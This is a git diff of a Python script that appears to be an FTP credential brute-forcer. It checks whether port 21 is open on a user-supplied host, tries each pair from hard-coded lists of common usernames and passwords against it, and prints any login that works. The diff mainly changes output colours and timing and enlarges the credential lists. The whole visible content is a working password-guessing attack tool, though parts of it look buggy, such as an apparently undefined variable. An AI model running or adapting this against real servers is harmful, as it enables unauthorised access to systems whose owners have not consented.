@@ -28,7 +28,7 @@ print("")
 url = input("url : ")
 response = requests.get("http://" + url)
 print("")
-print(Fore.GREEN + "[*]" + Style.RESET_ALL + (f" checking {url} status : {response.status_code}"))
+print(Fore.GREEN + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" checking {url} status : {response.status_code}"))
 time.sleep(0.30)
 
 if response.status_code == 200:
@@ -37,12 +37,12 @@ if response.status_code == 200:
     get_ip = socket.gethostbyname(url)
 
     print("")
-    print(Fore.GREEN + "[-]" + Style.RESET_ALL + (f" set host : {url}"))
+    print(Fore.YELLOW + "[-]" + Style.BRIGHT + Style.RESET_ALL + (f" set host : {url}"))
     time.sleep(2)
-    print(Fore.GREEN + "[-]" + Style.RESET_ALL + (f" host address : {get_ip} ..."))
+    print(Fore.YELLOW + "[-]" + Style.BRIGHT + Style.RESET_ALL + (f" host address : {get_ip} ..."))
     time.sleep(0.40)
-    print(Fore.GREEN + "[-]" + Style.RESET_ALL + (f" starting checking port...."))
-    time.sleep(0.40)
+    print(Fore.YELLOW + "[-]" + Style.BRIGHT + Style.RESET_ALL + (f" starting checking port...."))
+    time.sleep(3)
     print("")
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -51,17 +51,35 @@ if response.status_code == 200:
     code = s.connect_ex((url, port))
 
     if code == 0:
-        print(Fore.GREEN + "[+]" + Style.RESET_ALL + (f" {get_ip} Is Opening Port {port}"))
+        print(Fore.RED + "[+]" + Style.BRIGHT + Style.RESET_ALL + (f" {get_ip} Is Opening Port {port}"))
         time.sleep(3)
-        print(Fore.GREEN + "[-]" + Style.RESET_ALL + (f" Setting Up botton"))
+        print(Fore.GREEN + "[-]" + Style.BRIGHT +Style.RESET_ALL + (f" Setting Up botton"))
         time.sleep(5)
 
         ftp = ftplib.FTP(url)
 
         # list random username, password
 
-        username = ["root", "admin", "admin123"]
-        password = ["123456", "root123", "1234", "admin123"]
+        username = [
+            "root", 
+            "admin", 
+            "user",
+            "ftp",
+            "steve",
+            "nullbyte",
+        ]
+
+        password = [
+            "123456",
+            "password", 
+            "root", 
+            "1234", 
+            "PASSWORD",
+            "abc",
+            "abc123",
+            "admin123",
+        ]
+
         usernamess = random.choice(username)
         passwordss = random.choice(password)
 
@@ -69,39 +87,41 @@ if response.status_code == 200:
     
             for passwords in password:
                 
-                    print(Fore.GREEN + "[-]" + Style.RESET_ALL + (f" FTP Login Sweep Incorect"))
+                    print(Fore.GREEN + Style.BRIGHT + "[-]" + Style.RESET_ALL + (f" FTP Login Sweep Incorect"))
                     time.sleep(0.10)
-                    print(Fore.GREEN + "[-]" + Style.RESET_ALL + (f" Random Username, Password list"))
+                    print(Fore.YELLOW + Style.BRIGHT + "[*]" + Style.RESET_ALL + (f" Set Playload ( FTP CRACKED ) "))
+                    time.sleep(0.30)
+                    print(Fore.GREEN + Style.BRIGHT + "[-]" + Style.RESET_ALL + (f" Random Username, Password list"))
                     time.sleep(1)
-                    print(Fore.GREEN + "[+]" + Style.RESET_ALL + (f" Starting Cracking USR, PWD For {get_ip} "))
+                    print(Fore.GREEN + Style.BRIGHT + "[+]" + Style.RESET_ALL + (f" Starting Cracking USR, PWD For {get_ip} "))
                     time.sleep(0.30)
 
 
                     try:
                         ftp.login(usernames, passwords)
-                        print(Fore.GREEN + "[*]" + Style.RESET_ALL + (f" IP : {get_ip}"))
-                        print(Fore.GREEN + "[*]" + Style.RESET_ALL + (f" PORT : {port}"))
-                        print(Fore.GREEN + "[*]" + Style.RESET_ALL + (f" Username : {usernames}"))
-                        print(Fore.GREEN + "[*]" + Style.RESET_ALL + (f" Password : {passwords}"))
-                        print(Fore.GREEN + "[*]" + Style.RESET_ALL + (f" Login Success"))
+                        print(Fore.GREEN + "[*]" + Style.BRIGHT + Style.RESET_ALL + (" IP : " + Fore.GREEN + Style.BRIGHT + f"{get_ip}" + Style.RESET_ALL))
+                        print(Fore.GREEN + "[*]" + Style.BRIGHT + Style.RESET_ALL + (" PORT : " + Fore.GREEN + Style.BRIGHT + f"{port}" + Style.RESET_ALL))
+                        print(Fore.GREEN + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" Username : " + Fore.GREEN + Style.BRIGHT + f"{usernames}" + Style.RESET_ALL))
+                        print(Fore.GREEN + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" Password : " + Fore.GREEN + Style.BRIGHT + f"{passwords}" + Style.RESET_ALL))
+                        print(Fore.GREEN + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" Login Success"))
 
 
                     except ftplib.error_perm:
-                        print(Fore.RED + "[*]" + Style.RESET_ALL + (f" IP : {get_ip}"))
-                        print(Fore.RED + "[*]" + Style.RESET_ALL + (f" PORT : {port}"))
-                        print(Fore.RED + "[*]" + Style.RESET_ALL + (f" Username : {usernames}"))
-                        print(Fore.RED + "[*]" + Style.RESET_ALL + (f" Password : {passwords}"))
-                        print(Fore.RED + "[*]" + Style.RESET_ALL + (f" Login FAILED "))
+                        print(Fore.RED + "[*]" + Style.BRIGHT + Style.RESET_ALL + (" IP : " + Fore.GREEN + Style.BRIGHT + f"{get_ip}" + Style.RESET_ALL))
+                        print(Fore.RED + "[*]" + Style.BRIGHT + Style.RESET_ALL + (" PORT : " + Fore.GREEN + Style.BRIGHT + f"{port}" + Style.RESET_ALL))
+                        print(Fore.RED + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" Username : " + Fore.GREEN + Style.BRIGHT + f"{usernames}" + Style.RESET_ALL))
+                        print(Fore.RED + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" Password : " + Fore.GREEN + Style.BRIGHT + f"{passwords}" + Style.RESET_ALL))
+                        print(Fore.RED + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" Login FAILED "))
                         time.sleep(0.30)
 
     elif code == s.timeout:
                 print(f"[!] {get_ip} responsed time out")
 
     else:
-        print(Fore.RED + "[*]" + Style.RESET_ALL + (f" Port 21 Not Opening , Please Try Again !!! "))
+        print(Fore.RED + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" Port 21 Not Opening , Please Try Again !!! "))
         time.sleep(1)
         os.system('py main.py' if os.name == 'nt' else 'python main.py')
 
 else:
-    print(Fore.RED + "[*]" + Style.RESET_ALL + (f" {url} responsed time out"))
+    print(Fore.RED + "[*]" + Style.BRIGHT + Style.RESET_ALL + (f" {url} responsed time out"))
     os.system('py main.py' if os.name == 'nt' else 'python main.py')
